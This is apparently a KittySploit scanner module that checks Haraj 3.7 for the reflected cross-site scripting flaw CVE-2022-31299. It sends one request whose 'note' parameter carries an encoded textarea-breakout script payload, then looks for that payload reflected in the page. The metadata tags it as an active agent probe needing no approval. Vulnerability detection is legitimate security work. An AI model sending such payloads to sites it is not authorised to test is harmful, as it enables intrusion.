#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Haraj 3."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Haraj 3.7 - Cross-Site Scripting Detection',
        'description': 'Haraj 3.7 contains a cross-site scripting vulnerability in the User Upgrade Form. An attacker can inject malicious script and thus steal authentication credentials and launch other attacks.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2022', 'haraj', 'xss', 'angtech', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://github.com/bigzooooz/CVE-2022-31299',
            'https://angtech.org',
            'https://nvd.nist.gov/vuln/detail/CVE-2022-31299',
            'https://angtech.org/product/view/3',
            'https://github.com/trhacknon/Pocingit',
        ],
        'cve': 'CVE-2022-31299',
    }

    def run(self):
        r = self.http_request(method="GET", path='/payform.php?type=upgrade&upgradeid=1&upgradegd=6&price=123&t=1&note=%3C/textarea%3E%3Cscript%3Ealert(document.domain)%3C/script%3E', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = ('><script>alert(document.domain)</script></textarea>', 'content="nextHaraj',)
        header_any = ('text/html',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='medium',
                reason="Haraj 3.7 - Cross-Site Scripting detected",
                path='/payform.php?type=upgrade&upgradeid=1&upgradegd=6&price=123&t=1&note=%3C/textarea%3E%3Cscript%3Ealert(document.domain)%3C/script%3E',
            )
            return True
        return False

